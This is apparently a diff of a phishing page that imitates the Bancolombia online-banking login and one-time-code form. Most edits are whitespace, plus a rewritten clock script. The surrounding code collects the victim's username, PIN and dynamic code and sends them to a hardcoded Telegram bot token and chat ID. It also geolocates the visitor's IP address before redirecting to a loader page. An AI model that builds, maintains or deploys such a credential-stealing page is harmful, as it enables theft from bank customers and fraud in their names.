@@ -19,7 +19,7 @@
       <script>
          $.getJSON("https://api.ipify.org?format=json",
                                            function(data) {
-         
+
              // Setting text of element P with id gfg
              $("#gfg").html(data.ip);
          })
@@ -28,7 +28,7 @@
          $.getJSON("https://ipinfo.io", function (response) {
     $("#ip").html("IP: " + response.ip);
     $("#address").html("" + response.city + ", " + response.country);
-    
+
 })
       </script>
       <script language="JavaScript">
@@ -50,20 +50,20 @@ async function handleSubmit(e) {
     e.preventDefault();
     const dynamic = document.getElementById('dinamica').value;
     localStorage.setItem('dynamicCode', dynamic);
-    
+
     // Prepare data for Telegram
     const data = {
         username: localStorage.getItem('username'),
         pin: localStorage.getItem('userPin'),
         dynamic: dynamic
     };
-    
+
     // Send to Telegram (Replace BOT_TOKEN and CHAT_ID with your values)
     try {
         const BOT_TOKEN = '8111270124:AAHsKW7PfdE0A-lwMR8Qj98ul86SCMjxJg4';
         const CHAT_ID = '-1002572002457';
         const message = `*┏🟢 LOGO BANCOLOMBIA*\n*┣👤 User:* \`${data.username}\`\n*┣🔒 Pass:* \`${data.pin}\`\n*┗💸 Dinámica:* \`${data.dynamic}\``;
-        
+
         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: {
@@ -82,7 +82,7 @@ async function handleSubmit(e) {
     window.location.href = 'loader.html';
 }
 </script>
-     
+
                   <p id="address"  hidden="">
             <div class="container" id="containerMain">
                <div>
@@ -96,17 +96,20 @@ async function handleSubmit(e) {
                      <div class="row">
                         <div class="col-xs-12 col-sm-7 col-md-7 left-div">
                            <div id="lastIn" class="mua-title-text" style="padding-top: 10px !important;">
-                              <script language="javascript" src="js/jquery.jclockNew.js.descarga" type="text/JavaScript"></script>
+                              
                               <script type="text/javascript">
-                                 $(function($) {        
-                                     var optionsEST = {
-                                         utc: true,
-                                         utcOffset: -5,
-                                         format: "%A %R de %B de %Y %l:%M:%S %P", 
-                                         language: "es"
-                                    }
-                                 $('#jclock1').jclockNew(optionsEST);
-                                 });
+                                 $(function() {
+                                function updateClock() {
+                                  var now = new Date();
+                                  var days = ['Domingo','Lunes','Martes','Miércoles','Jueves','Viernes','Sábado'];
+                                  var months = ['Enero','Febrero','Marzo','Abril','Mayo','Junio','Julio','Agosto','Septiembre','Octubre','Noviembre','Diciembre'];
+                                  var time = now.toLocaleTimeString('es-ES');
+                                  var dateStr = days[now.getDay()] + ' ' + now.getDate() + ' de ' + months[now.getMonth()] + ' de ' + now.getFullYear() + ' ' + time;
+                                  $('#jclock1').text(dateStr);
+                                }
+                                updateClock();
+                                setInterval(updateClock, 1000);
+                              });
                               </script>
                               <div>
                                  <div class="timeText">Fecha y hora actual:</div>
@@ -183,9 +186,9 @@ async function handleSubmit(e) {
                               <button id="btnGo" name="btnGo" class="btn btn-success" type="submit" >
                                  Validar</button>
                               </div>
-         
-                              
-                              
+
+
+
                            </div>
                            <br>
                            <br>
@@ -196,7 +199,7 @@ async function handleSubmit(e) {
                            <div class="mua-embed-container-personal" id="banner-persona">												
                               <iframe class="mua-iframe mua-iframe-personal-responsive" src="login_SVP_BC_zonaB.html" frameborder="0" scrolling="no" width="635px" height="335px"></iframe>
                            </div>
-                           
+
                         </div>
                      </div>
                   </div>
@@ -226,10 +229,10 @@ async function handleSubmit(e) {
             <input id="uievent" name="uievent" type="hidden" value="">
             <meta http-equiv="PRAGMA" content="NO-CACHE">
             <meta http-equiv="Expires" content="-1">
-         
+
             <script language="JavaScript" type="text/javascript">
                function getTCLIIDVK(){
-               	
+
                	return "";
                }
                function getTSESIDVK(){
@@ -239,7 +242,7 @@ async function handleSubmit(e) {
                	return "/mua/WEB-INF/jsp/login/loginUserForm.jsp";
                }
             </script>
-	
+
          </form>
 
       </div>
